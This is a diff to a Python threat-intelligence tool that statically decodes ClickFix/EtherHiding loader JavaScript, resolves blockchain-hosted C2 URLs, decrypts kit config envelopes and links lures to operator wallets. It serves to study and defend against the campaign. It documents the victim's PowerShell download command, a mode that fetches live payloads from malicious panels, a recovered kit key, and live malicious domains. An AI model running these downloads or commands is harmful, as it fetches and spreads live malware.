@@ -1,24 +1,25 @@
 #!/usr/bin/env python3
 """
-ClickChain  v4.4  —  the ClickFix / ErrTraffic / ClearFake EtherHiding hunter.
-
+ClickChain  v4.5  —  the ClickFix / ErrTraffic / ClearFake EtherHiding hunter.
+(formerly decloak.py, then EtherHound)
 
 A chain-of-evidence tool for EtherHiding-backed ClickFix kits: extracts the
-blockchain-C2 loader from obfuscated lure pages, names the kit, and reads the
-live C2 off-chain — connecting clipboard lure → contract → panel → payload →
-operator wallet in one command.
-Built first for hunting LenAI's ErrTraffic / ClearFake fake-CAPTCHA kit family and
-their adjacent operators (Aeternum, OCRFix, UNC5142/CLEARSHORT when public), but
-generalizes to arbitrary obfuscated EtherHiding loader JS.
+blockchain-C2 loader from obfuscated lure pages, names the kit, decrypts the
+panel's live encrypted config envelopes, and connects lure → contract → panel
+→ payload → operator wallet in one command. Built first for hunting LenAI's
+ErrTraffic / Aeternum kit family — including their May-2026 "BW v2" generation
+(AES-256-GCM envelopes, uj/rlm URL param schema) — and adjacent EtherHiding
+campaigns (ClearFake, UNC5142/CLEARSHORT, UNC5342/DPRK).
 
 CAPABILITIES
 ============
 1.  STATIC DECODE — peel obfuscated loader JS WITHOUT executing it.
-    5 schemes (atob+byte-transform via sub-table/arithmetic/XOR/rolling-key,
-    UTF-8 round-trip, reversed-atob, charcode arrays, hex-escape blobs)
-    run through a sandboxed Python AST evaluator. 6 classifiers fire on
-    the recovered text: EtherHiding loader, clipboard PS, AES kit,
-    PowerShell command, TDS beacon, anti-analysis gate.
+    6 schemes (BW-v2 IIFE-wrapped XOR decoder, atob+byte-transform via
+    sub-table / arithmetic / XOR / rolling-key, UTF-8 round-trip,
+    reversed-atob, charcode arrays, hex-escape blobs) run through a
+    sandboxed Python AST evaluator. 7 classifiers fire on the recovered
+    text: EtherHiding loader, clipboard PS, AES kit, BW v2 plaintext
+    launcher, PowerShell command, TDS beacon, anti-analysis gate.
 
 2.  ROLE AUTO-DETECT — `classify_input_role` probes /api/index.php?a=init
     to decide whether the input is a LURE (compromised site running the
@@ -27,6 +28,9 @@ CAPABILITIES
 
 3.  ON-CHAIN RESOLVE  (--resolve) — passive read-only `eth_call` to the
     documented RPC pool, decode the contract return as the current C2 URL.
+    Supports both v3 original `getURL()` (selector 0x38bcdc1c) and the
+    Aeternum-pattern `getDomain()` (selector 0xb68d1809) used by the BW v2
+    panel-router contracts.
 
 4.  CONTRACT INVESTIGATE  (--investigate-contract ADDR) — pull current
     state, bytecode selectors (PUSH4 dispatch scan), recent setURL
@@ -44,21 +48,33 @@ CAPABILITIES
     fetch + decode + classify + on-chain resolve + dual server fingerprint
     + WP + CF detect + mu-plugins backdoor probe (per LevelBlue 2026) +
     AES clipboard recovery + (optional) per-OS payload download. In PANEL
-    mode: skip lure decode, go straight to /api/index.php?a=init for each OS.
+    mode: skip lure decode, probe + AES-256-GCM-decrypt the /api/cfg and
+    /api/settings envelopes (yielding the operator's live mode/enabled/
+    blockBots/rentalExpired config in plaintext), then go straight to
+    /api/index.php?a=init for each OS.
 
-6.  PAYLOAD DOWNLOAD (--payload) — 4-strategy chain for each OS:
+6.  PAYLOAD DOWNLOAD (--payload) — 5-strategy chain for each OS:
         (0) known-token /api/index.php?a=dl  (from --payload-token or AES recovery)
         (1) v3 admin mint /index.php?action=generateDownloadToken     (per Censys)
         (2) v2 admin mint /api/generate-download-token.php           (legacy)
-        (3) v3 runtime init→AES→dl   ← THE working path in May 2026
-    Saves binary + raw AES clipboard PS + decrypted dropper PS side-by-side
-    with defanged `.bin` / `.clipboard.ps1` / `.decoded.ps1` suffixes.
+        (3) v3 runtime init→AES→dl   (the v3 original / lenders.digital era flow)
+        (4) v3 BW v2 init→dl?uj=     (the BW v2 generation / slndcdnclaud.beer era flow)
+    Saves binary + raw clipboard PS + decrypted dropper PS side-by-side with
+    defanged `.bin` / `.clipboard.ps1` / `.decoded.ps1` suffixes.
 
-7.  BATCH — accept a single domain/URL or a file of newline-separated
+7.  ENVELOPE DECRYPT — `decrypt_api_envelope()` ports the kit's own
+    `decryptApiEnvelope()` JS function to Python. Implements both:
+        gcm1 mode  (modern, AES-256-GCM, scope-keyed: sha256(K || scope+"|gcm1"))
+        q2 mode    (legacy, RC4 with key = baseKey || nonce)
+    Prefers pycryptodome / cryptography if installed; falls back to a
+    vendored pure-Python AES-GCM (NIST SP 800-38D compliant, KAT-verified)
+    + RC4. The kit-author's documented API_Q2_KEY_HEX is preloaded.
+
+8.  BATCH — accept a single domain/URL or a file of newline-separated
     targets (defanged or not), fetch concurrently, emit results to
     text/JSON/JSONL/CSV simultaneously. Built to run on 4,000+ domains.
 
-8.  --dump DIR — DEBUG mode: writes every raw artifact (lure HTML, init JSON,
+9.  --dump DIR — DEBUG mode: writes every raw artifact (lure HTML, init JSON,
     AES PS, decrypted PS, recovered binary, role-probe response, full
     per-strategy diagnostics) into DIR for offline analysis.
 
@@ -71,19 +87,29 @@ ErrTraffic kit timeline (advertised by LenAI on cybercrime forum, $800 USD):
   - v3 (Feb 1 2026 →): EtherHiding adoption. Polygon mainnet smart contracts
     hold the current C2 URL; loader calls getURL() via eth_call. Operator
     rotates without touching compromised sites.
+  - v3 BW v2 generation (May 2026 →): JavaScript codebase bumped — kit
+    internal marker `__BW_SCRIPT_INITIALIZED_V2__`, 10-theme MODE_FILE_MAP
+    (browser/font/recaptcha/bsod/silent/cloudflare/cf_update/mac_recaptcha/
+    mac_cloudflare/recaptcha_win_r — the last per Atos's Win+R-variant
+    documentation), AES-256-GCM envelopes (`enc:"gcm1"`) on /api/cfg and
+    /api/settings, URL param rename token→uj, src→rlm, mode→encoded-rlm.
+    On-chain layer shifted to Aeternum-pattern getDomain() selector.
+    Documented by LevelBlue SpiderLabs 2026; full crypto reverse-engineered
+    from the kit's /api/css.js loader on 2026-05-27.
 
 ErrTraffic v3 runtime victim flow (the chain --payload replicates):
-  1. Compromised WordPress site loads obfuscated <script> injected by
-     PHP backdoor in /wp-content/mu-plugins/session-manager.php
-  2. Loader JS does eth_call to KNOWN_ACTORS[ErrTraffic v3 contract] →
-     returns the current C2 panel URL (lenders.digital as of May 2026)
-  3. Browser calls panel /api/index.php?a=init&os=<os>&src=<lure>&mode=cloudflare
-  4. Panel returns {"ok": true, "token": "<AES PowerShell>"} — `token`
-     field is the AES PS the kit writes to victim clipboard, NOT a
-     download token
-  5. Browser writes AES PS to clipboard. Victim pastes into Run dialog.
-  6. PowerShell AES-decrypts → fetches /api/index.php?a=dl&token=<HEX>
-     with the dropper-embedded token → drops binary → executes
+  v3 ORIGINAL (lenders.digital era):
+    1. Loader eth_calls getURL() on Polygon contract → C2 hostname
+    2. Browser POSTs /api/index.php?a=init&os=<os>&src=<lure>&mode=cloudflare
+    3. Panel returns {"ok":true,"token":"<AES-CBC PowerShell>"} — token is
+       an AES-encrypted PS, written to victim clipboard, decoded locally
+    4. Decrypted PS does /api/index.php?a=dl&token=<HEX> → binary
+  v3 BW v2 (slndcdnclaud.beer era, current as of May 2026):
+    1. Loader eth_calls getDomain() (Aeternum selector) → C2 hostname
+    2. Loader GETs /api/cfg → AES-GCM envelope ← we decrypt this passively
+    3. Browser GETs /api/index.php?a=init → {"token":"<sha256-hex>"} (plain)
+    4. Plaintext clipboard PS: `Invoke-WebRequest -Uri '<panel>/api/dl?uj=<hex>&rlm=<b64>' …`
+    5. Victim pastes → PS GET /api/index.php?a=dl&uj=...&rlm=... → binary
 
 Adjacent EtherHiding-using campaigns:
   - UNC5142 / CLEARSHORT (Mandiant): BNB Smart Chain, 3-tier contracts
@@ -141,7 +167,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Any, Iterable
 
 TOOL_NAME       = "ClickChain"
-TOOL_VERSION    = "clickchain/4.4"
+TOOL_VERSION    = "clickchain/4.5"
 SCHEMA_VERSION  = 4
 
 # Force UTF-8 stdout BEFORE argparse / any print runs (Windows cp1252 default
@@ -214,10 +240,61 @@ KNOWN_ACTORS: dict[str, dict] = {
         "name":          "Aeternum Loader — C2 holding contract",
         "kit":           "Aeternum (LenAI family)",
         "chain":         "polygon",
+        "selectors":     {"0xb68d1809": "getDomain()"},
         "confidence":    "high",
         "note":          ("13+ 'Update Domain' tx, all from LenAI deployer 0xcaf2…7abf. "
                           "Similar single-string-state pattern as ErrTraffic v3 C2 contracts."),
-        "sources":       ["Ctrl-Alt-Int3l 2026"],
+        "sources":       ["Ctrl-Alt-Int3l 2026", "The Hacker News Aeternum 2026-02"],
+    },
+    # LenAI secondary deployer/operator wallet — per Ctrl-Alt-Int3l Aeternum Part 2.
+    "0x6e3c232c3c61dfce05e677cc351b3d0d677ee49b": {
+        "kind":          "deployer_wallet",
+        "name":          "LenAI — secondary deployer wallet",
+        "kit":           "ErrTraffic / Aeternum",
+        "chain":         "polygon",
+        "confidence":    "high",
+        "note":          ("Listed alongside 0xcaf2…7abf as a LenAI-controlled wallet. "
+                          "Use as a cross-reference seed for additional deployments."),
+        "sources":       ["Ctrl-Alt-Int3l Aeternum Part 2 (2026)"],
+    },
+    # ErrTraffic v3 (BW v2 generation) — fresh contract using Aeternum's getDomain()
+    # selector pattern. Confirmed live via chain query 2026-05-27:
+    #   getDomain() -> "https://slndcdnclaud.beer"  (plaintext UTF-8, no XOR/GCM)
+    #   admin()     -> 0xb0425bf235a2275735c8c5d668aa0273c65970b9  (operator wallet)
+    # The panel at slndcdnclaud.beer runs the documented ErrTraffic v3 kit in its
+    # BW v2 JavaScript generation (__BW_SCRIPT_INITIALIZED_V2__ marker, gcm1
+    # envelope, 10-mode MODE_FILE_MAP catalog). NOT a new kit — a fresh deployment
+    # of LenAI's existing ErrTraffic v3 codebase using Aeternum-style routing.
+    "0x07b4ab119f16743effeba66ce1f23fc0346327f8": {
+        "kind":          "c2_contract",
+        "name":          "ErrTraffic v3 (BW v2 generation) — panel-router contract",
+        "kit":           "ErrTraffic v3 (BW v2 generation)",
+        "chain":         "polygon",
+        "selectors":     {"0xb68d1809": "getDomain()", "0xf851a440": "admin()"},
+        "confidence":    "high",
+        "first_seen":    "2026-05-27 (clickchain.py chain probe)",
+        "note":          ("getDomain() returns 'https://slndcdnclaud.beer' in PLAINTEXT — "
+                          "uses Aeternum's b68d1809 selector pattern but with the ErrTraffic "
+                          "v3 (BW v2) panel kit behind it. The panel exposes /api/index.php "
+                          "?a=init|cfg|dl|evt and uses the gcm1 (AES-256-GCM) envelope per "
+                          "LevelBlue SpiderLabs 2026. Operator wallet (admin()) is "
+                          "0xb0425bf235...65970b9 — not in any prior public CTI we found."),
+        "sources":       ["clickchain.py chain probe 2026-05-27",
+                          "LevelBlue SpiderLabs ErrTraffic v3 2026",
+                          "Ctrl-Alt-Int3l Aeternum 2026"],
+    },
+    # The operator-controller wallet behind the slndcdnclaud.beer panel.
+    # Verified via admin() on contract 0x07b4ab...327f8.  No prior public CTI.
+    "0xb0425bf235a2275735c8c5d668aa0273c65970b9": {
+        "kind":          "controller_wallet",
+        "name":          "ErrTraffic v3 (BW v2) — operator-controller wallet for 0x07b4aB...",
+        "kit":           "ErrTraffic v3 (BW v2 generation)",
+        "chain":         "polygon",
+        "confidence":    "high",
+        "note":          ("admin() of 0x07b4aB119F...327F8 returns this address. "
+                          "Independently chain-verified ownership. NOT documented in any "
+                          "public CTI as of 2026-05-27 — novel pivot."),
+        "sources":       ["clickchain.py admin() verification 2026-05-27"],
     },
     # ---- ClearFake on BSC testnet (LevelBlue 2026) -------------------------
     "0xa1decfb75c8c0ca28c10517ce56b710baf727d2e": {
@@ -287,6 +364,31 @@ KNOWN_SELECTORS: dict[str, dict] = {
         "context":   "Solidity Ownable ownership-transfer — would indicate operator-handoff if observed",
         "sources":   ["4byte.directory"],
     },
+    # Aeternum-pattern domain getter — used by both Aeternum (0x4d70C3…) and the
+    # ErrTraffic v3 (BW v2 generation) panel-router contracts (0x07b4aB… and
+    # presumably others by the same operator). Return value is plain UTF-8 in
+    # the observed ErrTraffic-v3-via-Aeternum case; the Aeternum loader binary
+    # additionally AES-GCM-decrypts (PBKDF2-HMAC-SHA256 100k iter) its return.
+    "0xb68d1809": {
+        "signature": "getDomain()",
+        "returns":   "string_lax",
+        "context":   ("Aeternum-family domain getter. Plain UTF-8 in ErrTraffic v3 (BW v2) "
+                      "panel-router contracts; AES-256-GCM-encrypted in original Aeternum "
+                      "loader binary per Ctrl-Alt-Int3l 2026."),
+        "sources":   ["Ctrl-Alt-Int3l 2026", "clickchain.py chain probe 2026-05-27"],
+    },
+    "0x41c0e1b5": {
+        "signature": "kill()",
+        "returns":   "void",
+        "context":   "Self-destruct — observed on a small fraction of Aeternum-pattern contracts.",
+        "sources":   ["4byte.directory"],
+    },
+    "0x4fb2e45d": {
+        "signature": "transferOwner(address)",
+        "param":     "address",
+        "context":   "Non-standard ownership-transfer — observed on some Aeternum-pattern contracts.",
+        "sources":   ["4byte.directory"],
+    },
 }
 
 # ============================================================================
@@ -304,12 +406,23 @@ ERRTRAFFIC_KIT = {
     #      with LONG action `action=generateDownloadToken` / `action=download`.
     #      This is what Censys' standalone payload downloader script targets.
     "panel_endpoints_v3_runtime": {           # victim browser → /api/index.php?a=...
-        "init":      "/api/index.php?a=init",     # returns AES blob containing dl URL+token
-        "cfg":       "/api/index.php?a=cfg",      # config / TDS gate
-        "evt":       "/api/index.php?a=evt",      # telemetry / page-view
-        "dl":        "/api/index.php?a=dl",       # download — requires &token=&src=&mode=
-        "css_js":    "/api/css.js",               # external loader (v3, no .php)
-        "settings":  "/api/index.php?action=settings",
+        # Both response shapes observed in the wild:
+        #   v3 original (AES-CBC clipboard wrap):    {"ok":true,"token":"<AES PS>"}
+        #   v3 BW v2 generation (May 2026+):         {"token":"<hex64>"}
+        "init":      "/api/index.php?a=init",
+        # Returns encrypted envelope {"enc":"gcm1","q":"<b64url>"}  OR  {"enc":"q2","q":"<b64url>"}
+        # Decrypt via decrypt_api_envelope() with scope="cfg".
+        "cfg":       "/api/index.php?a=cfg",
+        # Same response shape as cfg in BW v2 (some deployments use this alias).
+        "settings":  "/api/index.php?a=settings",
+        # Telemetry / page-view beacon (POST-only on BW v2; GET returns 405).
+        "evt":       "/api/index.php?a=evt",
+        # Download — BW v2 accepts: token=, uj=, or t= (operator-renamed aliases).
+        "dl":        "/api/index.php?a=dl",
+        # External loader source (XOR-encoded, key in inline var; BW v2 ships here).
+        "css_js":    "/api/css.js",
+        # Legacy admin alias — kept for backward-compat with older v3 deployments.
+        "settings_legacy":  "/api/index.php?action=settings",
     },
     "panel_endpoints_v3_admin": {             # operator/admin → /index.php?action=... (NO /api/)
         "gen_token": "/index.php?action=generateDownloadToken",  # ← was wrong (had /api/)
@@ -347,23 +460,181 @@ ERRTRAFFIC_KIT = {
                      "headless","phantom","selenium","webdriver","playwright",
                      "puppeteer","lighthouse","pingdom","monitor","preview"],
     # Census-observed XOR keys in v3 loader variants
-    "v3_xor_keys_seen": [141, 222, 242, 211, 161, 51, 71, 54, 241],
+    "v3_xor_keys_seen": [141, 222, 242, 211, 161, 51, 71, 54, 241, 69],
     # Database table names (v2 schema documented by Censys)
     "v2_db_tables":  ["et_users","et_settings","et_files","et_download_tokens","et_events"],
     # Censys-discoverable signature (Set-Cookie header pattern)
     "censys_query":  'web.endpoints.http.headers: (key: "Set-Cookie" and value: "errtraffic_session=")',
     "advertised_at": "$800 (Russian-language cybercrime forum, Dec 2025)",
+
+    # ── BW v2 generation (May 2026 deployments) ────────────────────────────────
+    # ErrTraffic v3's JavaScript codebase has gone through generational bumps the
+    # kit author labels internally as "BW v1" → "BW v2" (BW = BrowserWarning, per
+    # the historical window.BrowserWarningConfig var). BW v2 is the current modern
+    # generation observed on slndcdnclaud.beer and presumably across the broader
+    # ErrTraffic v3 panel fleet as of May 2026.
+    #
+    # This is NOT a new kit (no "v4" exists in any public CTI). The on-the-wire
+    # /api/index.php?a=… endpoints are unchanged; only the loader JS internals,
+    # the URL param names, and the envelope-encryption scheme have evolved.
+    "bw_v2": {
+        # JavaScript-level identification markers (used by detect_errtraffic_version
+        # and the BW v2 obfuscation matcher).
+        "js_markers": [
+            "__BW_SCRIPT_INITIALIZED__",     # original BW marker (Censys-documented)
+            "__BW_SCRIPT_INITIALIZED_V2__",  # BW v2 generation marker (our find)
+            "BW_CONFIG",                      # kit config var (Censys-documented)
+            "__BW_CONTRACT_OVERRIDE",         # debug/override hook (kit-author dev path)
+            "__bwDecryptApiEnvelope",         # window-exported helper for runtime decrypt
+            "MODE_FILE_MAP",                  # theme catalog var
+        ],
+        # Storage keys the kit uses for victim deduplication.
+        "storage_keys": {
+            "primary":       "site_repair_state",   # BW v2 current primary
+            "legacy":        "bw-downloaded",       # BW v1 legacy (kept for backward compat)
+        },
+        # The 10 lure-theme modes — `MODE_FILE_MAP` in the loader JS. Each maps
+        # to a per-theme runtime file the panel serves.
+        "mode_file_map": {
+            "browser":          "v1.js",   # Browser Update theme
+            "font":             "v2.js",   # System Font Missing theme
+            "recaptcha":        "v3.js",   # Fake reCAPTCHA (classic ClickFix)
+            "bsod":             "v4.js",   # BSOD theme
+            "silent":           "v5.js",   # Silent / test mode (no display)
+            "cloudflare":       "v6.js",   # Cloudflare "Verify you are human"
+            "cf_update":        "v7.js",   # Cloudflare-themed update
+            "mac_recaptcha":    "v8.js",   # macOS reCAPTCHA
+            "mac_cloudflare":   "v9.js",   # macOS Cloudflare
+            "recaptcha_win_r":  "v10.js",  # Windows-key+R variant (Atos-documented May 2026)
+        },
+        # API envelope encryption — the panel encrypts /api/cfg and /api/settings
+        # responses (and signed requests) under one of two modes. Documented by
+        # LevelBlue SpiderLabs 2026; full algorithm reverse-engineered from
+        # /api/css.js loader extraction 2026-05-27.
+        "envelope_modes": {
+            # CURRENT (modern): AES-256-GCM with scope-keyed derivation.
+            #   packed   = b64url_decode(obj.q)         [iv(12) || cipher_with_tag(N+16)]
+            #   key      = sha256( hex_to_bytes(API_Q2_KEY_HEX) || utf8(scope + "|gcm1") )
+            #   scope    = ∈ {"cfg","init","dl","evt"} (regex /^[a-z0-9_]{1,16}$/i, default "cfg")
+            #   plain    = AES-GCM-decrypt(key, iv, cipher_with_tag, tag_length=128)
+            "gcm1": {
+                "algorithm":        "AES-256-GCM",
+                "iv_bytes":         12,
+                "tag_bits":         128,
+                "key_derivation":   "sha256(API_Q2_KEY || utf8(scope + '|gcm1'))",
+                "scope_pattern":    r'^[a-z0-9_]{1,16}$',
+                "default_scope":    "cfg",
+                "encoding":         "base64-url-safe (no padding)",
+            },
+            # LEGACY: RC4 with key = base_key || nonce  (kit's "q2" envelope).
+            #   packed   = b64url_decode(obj.q  OR  obj.q2 fallback)
+            #   nonce    = packed[0:8]
+            #   ciphertext = packed[8:]
+            #   keyMat   = base_key || nonce       (raw concat, NOT hashed)
+            #   plain    = RC4(keyMat, ciphertext)
+            "q2": {
+                "algorithm":        "RC4",
+                "nonce_bytes":      8,
+                "key_derivation":   "base_key_bytes || nonce_bytes (raw concat)",
+                "encoding":         "base64-url-safe (no padding)",
+            },
+        },
+        # Panel endpoints with their envelope scope. The scope binds the derived
+        # AES-GCM key (so cfg-key != init-key != dl-key != evt-key).
+        "scopes": {
+            "init":     "init",     # session init / token mint
+            "cfg":      "cfg",      # latest config (encrypted)
+            "settings": "cfg",      # alias used in some deployments
+            "dl":       "dl",       # download token mint
+            "evt":      "evt",      # telemetry event
+        },
+        # URL parameters seen across BW v2 deployments. We accept ANY of these
+        # as the download-token alias; the kit author rotates aliases between
+        # deployments to defeat signature-based detection.
+        "token_param_aliases": [
+            "token",   # original v3 name (lenders.digital era)
+            "uj",      # BW v2 rename observed on slndcdnclaud.beer (2026-05-27)
+            "t",       # short-form sometimes seen on /evt beacons
+        ],
+        # The lure-source / kit-mode binding param (was `src=`+`mode=` in v3
+        # original; collapsed into `rlm=` on BW v2 — value is 4 base64-url bytes
+        # encoding a small per-deploy ID).
+        "src_param_aliases": ["src", "rlm"],
+        # The encrypted-envelope payload field name (in JSON responses and in
+        # ?q=... URL params for signed outgoing requests).
+        "envelope_field":   "q",
+        # Beacon (a=evt) parameter list — small abbreviated keys per LevelBlue.
+        "beacon_params":    ["a","d","ip","r","m","u","l","dv","br","os","f","t"],
+        # Default sample mode/src values to use when minting tokens.
+        "default_src":      "clickfix",
+        "default_mode":     "cloudflare",
+    },
+    # Recovered API_Q2_KEY_HEX values, indexed by panel host where observed.
+    # The kit ships the key hardcoded in /api/css.js — same key across all panels
+    # in a given kit-author build, until LenAI rotates the build. Multiple keys
+    # may co-exist if the operator runs multiple panel fleets.
+    "bw_v2_keys": {
+        # Default — the literal key from /api/css.js on slndcdnclaud.beer
+        # (extracted 2026-05-27 via static loader decode). Documented by LevelBlue
+        # SpiderLabs as API_Q2_KEY_HEX (literal value redacted in their writeup).
+        "API_Q2_KEY_HEX": "f41fc75b5a2d040901bfd6b038da14f4f4aa96f0cad59c4cc721c07c62efe3a2",
+        # Per-host override map for when the operator rotates the key per fleet.
+        "by_host": {
+            "slndcdnclaud.beer": "f41fc75b5a2d040901bfd6b038da14f4f4aa96f0cad59c4cc721c07c62efe3a2",
+        },
+    },
 }
 
 # Distinct v2 vs v3 endpoint patterns -> version detection from a URL
 def detect_errtraffic_version(url: str) -> str:
-    """Given a recovered staging URL or panel endpoint, classify v2 vs v3."""
+    """Given a recovered staging URL or panel endpoint, classify v2 vs v3.
+    Returns one of: 'v2', 'v3', 'v3_bwv2', 'unknown'.
+
+    The `v3_bwv2` tier identifies the May 2026+ BW v2 generation by the
+    URL-level param-rename signature (uj=/rlm=). Use detect_errtraffic_generation
+    for stronger detection against decoded loader text (which sees the JS markers).
+    """
     u = url.lower()
-    if "index.php" in u and ("a=" in u or "action=" in u): return "v3"
+    # BW v2 generation: any of the renamed URL params present
+    if re.search(r'[?&](uj|rlm)=', u): return "v3_bwv2"
+    if "index.php" in u and ("a=" in u or "action=" in u or "?q=" in u or "&q=" in u): return "v3"
     if "generate-download-token.php" in u or "download.php" in u or "/api/log.php" in u: return "v2"
     if "/api/css.js.php" in u: return "v2"
     if "/api/css.js" in u: return "v3"
     return "unknown"
+
+
+def detect_errtraffic_generation(loader_text: str) -> dict:
+    """Decide ErrTraffic v3 generation from the DECODED loader JS body.
+
+    Looks for the BW v2 marker hierarchy + the gcm1/q2 envelope plumbing.
+    Returns: {"generation": "bw_v1" | "bw_v2" | "v3_unknown",
+              "markers_found": [str...],
+              "confidence": float 0..1}
+    """
+    found = []
+    bw_v2 = ERRTRAFFIC_KIT.get("bw_v2", {})
+    text = loader_text or ""
+    for m in bw_v2.get("js_markers", []):
+        if m in text: found.append(m)
+    # MODE_FILE_MAP entries (theme files v1.js..v10.js) — strong BW v2 signal
+    mfm_hits = sum(1 for theme, fn in bw_v2.get("mode_file_map", {}).items()
+                   if f"'{theme}'" in text or f'"{theme}"' in text or
+                      f"'{fn}'" in text or f'"{fn}"' in text)
+    if mfm_hits >= 4: found.append(f"MODE_FILE_MAP({mfm_hits}/10 themes seen)")
+    # Envelope plumbing
+    if "decryptApiEnvelope" in text:                    found.append("decryptApiEnvelope")
+    if '"gcm1"' in text or "'gcm1'" in text:            found.append("envelope_gcm1")
+    if "API_Q2_KEY_HEX" in text:                        found.append("API_Q2_KEY_HEX")
+    # Generation pick
+    if "__BW_SCRIPT_INITIALIZED_V2__" in text or "site_repair_state" in text \
+       or 'decryptApiEnvelope' in text or '"gcm1"' in text or "MODE_FILE_MAP" in text:
+        return {"generation": "bw_v2", "markers_found": found,
+                "confidence": min(1.0, 0.5 + 0.1 * len(found))}
+    if "__BW_SCRIPT_INITIALIZED__" in text or "BW_CONFIG" in text or "bw-downloaded" in text:
+        return {"generation": "bw_v1", "markers_found": found,
+                "confidence": min(1.0, 0.4 + 0.1 * len(found))}
+    return {"generation": "v3_unknown", "markers_found": found, "confidence": 0.0}
 
 # Polygon RPC pool used by ErrTraffic v3 loaders + our resolver fallback.
 DEFAULT_RPC_POOL = {
@@ -600,7 +871,93 @@ def scheme_hex_escape_blob(code: str, ns: dict):
     return bytes_.decode("utf-8", "replace"), f"hexEscape({len(bytes_)}B)"
 
 
+# Pattern for the BW v2 / ErrTraffic v3 (May 2026 generation) loader layout:
+#
+#   (function(){
+#     var KEY = <int>;
+#     var BLOB = '<base64>';
+#     function DECODER(s, k) {
+#       s = atob(s);
+#       /* arr[i] = s.charCodeAt(i) ^ k; */
+#       /* utf-8 round-trip via TextDecoder or escape() fallback */
+#     }
+#     var X = DECODER(BLOB, KEY);
+#     (new Function(X))();
+#   })();
+#
+# The decoder function is one layer of indirection deeper than the generic
+# atob_byte_transform scheme handles (which looks for charCodeAt at the top
+# scope). This scheme matches the IIFE explicitly: identify the decoder
+# function by its body (atob + charCodeAt + XOR), then find the call site
+# DECODER(BLOB, KEY) to bind the arguments, then apply.
+# The regex captures any 2-arg function whose body contains the canonical
+# atob+XOR pattern, regardless of which parameter is the data and which is the
+# key. We disambiguate at the call site by argument TYPE (str → blob, int → key).
+_RE_BW_V2_DECODER_FN = re.compile(
+    r'function\s+(\w+)\s*\(\s*(\w+)\s*,\s*(\w+)\s*\)\s*\{[^}]*?'
+    r'\batob\s*\([^)]+\)[^}]*?'
+    r'\.charCodeAt\s*\([^)]+\)\s*\^\s*(?:\2|\3)'
+    r'[^}]*?\}',
+    re.S
+)
+
+
+def scheme_bw_v2_iife_xor(code: str, ns: dict):
+    """Match the ErrTraffic v3 (BW v2 generation) IIFE-wrapped XOR loader.
+    The decoder is defined as a nested function and called with (BLOB, KEY)
+    explicit args. Mirrors the kit's exact JS: atob → byte XOR → utf-8 with
+    `decodeURIComponent(escape(...))` fallback.
+
+    Returns (decoded_text, info_str) on success, or (None, reason_str)."""
+    m = _RE_BW_V2_DECODER_FN.search(code)
+    if not m: return None, None
+    fn_name, src_param, key_param = m.group(1), m.group(2), m.group(3)
+    # Find a USABLE call site: FN_NAME(BLOB, KEY) OR FN_NAME(KEY, BLOB). Match
+    # ALL occurrences and skip the function signature itself (whose args are
+    # the parameter names s,k which aren't in the page namespace). Pick the
+    # first call whose two args resolve to a (str, int) pair in either order.
+    call_re = re.compile(rf'\b{re.escape(fn_name)}\s*\(\s*(\w+)\s*,\s*(\w+)\s*\)')
+    blob = key = None
+    chosen_args = (None, None)
+    for cm in call_re.finditer(code):
+        a1, a2 = cm.group(1), cm.group(2)
+        # Skip the function-definition signature line (args are parameter names)
+        if {a1, a2} == {src_param, key_param}: continue
+        v1, v2 = ns.get(a1), ns.get(a2)
+        if isinstance(v1, str) and isinstance(v2, int):
+            blob, key, chosen_args = v1, v2, (a1, a2); break
+        if isinstance(v2, str) and isinstance(v1, int):
+            blob, key, chosen_args = v2, v1, (a1, a2); break
+    if blob is None or key is None:
+        return None, (f"BW-v2 decoder fn `{fn_name}` defined but no usable "
+                      f"(blob,key) call site found in code")
+    a1, a2 = chosen_args
+    # Sanity-check XOR key is a single byte
+    if not (0 <= key <= 0xFF):
+        return None, f"BW-v2 XOR key out of byte range: {key}"
+    # Decode: atob(blob) -> bytes ^ key -> utf-8 (with the kit's escape fallback)
+    try:
+        raw = _b64(blob)
+    except Exception as e:
+        return None, f"BW-v2 base64 decode failed: {e}"
+    out = bytes(b ^ key for b in raw)
+    try:
+        text = out.decode("utf-8")
+    except UnicodeDecodeError:
+        # Mirror the kit's `decodeURIComponent(escape(tmp))` fallback by reading
+        # the bytes as latin-1 first then UTF-8 — for our purposes treating the
+        # bytes as latin-1 captures whatever the loader meant.
+        text = out.decode("latin-1")
+    return text, (f"BW-v2 IIFE XOR: fn={fn_name}, blob={a1 if blob is v1 else a2} "
+                  f"({len(raw)}B), key=0x{key:02x} ({key})")
+
+
 SCHEMES = [
+    # Order matters — most specific first. The BW v2 IIFE matcher catches
+    # explicit `decoder(BLOB, KEY)` calls which the generic top-scope
+    # atob_byte_transform misses (it can't reach through the function
+    # indirection).
+    ("bw_v2_iife_xor",       scheme_bw_v2_iife_xor),
     ("atob_byte_transform",  scheme_atob_byte_transform),
     ("atob_utf8_roundtrip",  scheme_atob_utf8_roundtrip),
     ("atob_reversed",        scheme_atob_reversed),
@@ -650,7 +1007,11 @@ _ETH_RPC_HOST_RE  = re.compile(
     r'bnbchain\.org|binance\.org|onfinality\.io)/?[^\s\'"<>)\]}]*', re.I)
 _ETH_ADDR_RE       = re.compile(r"['\"](0x[a-fA-F0-9]{40})['\"]")
 _ETH_SELECTOR_RE   = re.compile(r"data\s*:\s*['\"]0x([a-fA-F0-9]{8,16})['\"]"
-                                r"|data\s*:\s*['\"]0x['\"]\s*\+\s*(\w+)")
+                                r"|data\s*:\s*['\"]0x['\"]\s*\+\s*(\w+)"
+                                # BW v2 generation: 'FUNCTION_SELECTOR:"b68d1809"' inside
+                                # a CONTRACT_CONFIG object — the kit author's modern layout.
+                                r"|(?:FUNCTION_SELECTOR|methodSelector|FN_SELECTOR|selectorHex)"
+                                r"\s*[:=]\s*['\"]0?x?([a-fA-F0-9]{8})['\"]")
 _ETH_SEL_VAR_RE    = re.compile(r"""\b(\w+)\s*=\s*['"]([a-fA-F0-9]{6,16})['"]""")
 _ETH_CALL_RE       = re.compile(r"method\s*:\s*['\"]eth_call['\"]", re.I)
 _CHAIN_HINTS = [
@@ -705,7 +1066,9 @@ def classify_etherhiding(text: str) -> dict | None:
     sel = None
     m = _ETH_SELECTOR_RE.search(text)
     if m:
-        raw = m.group(1) or m.group(2)
+        # groups: (1) literal 0x... in data, (2) var-name in data:0x+var,
+        # (3) FUNCTION_SELECTOR/methodSelector literal — BW v2 layout
+        raw = m.group(1) or m.group(3) or m.group(2)
         if raw and len(raw) in (8, 16) and all(c in "0123456789abcdefABCDEF" for c in raw):
             sel = raw.lower()
         elif raw:
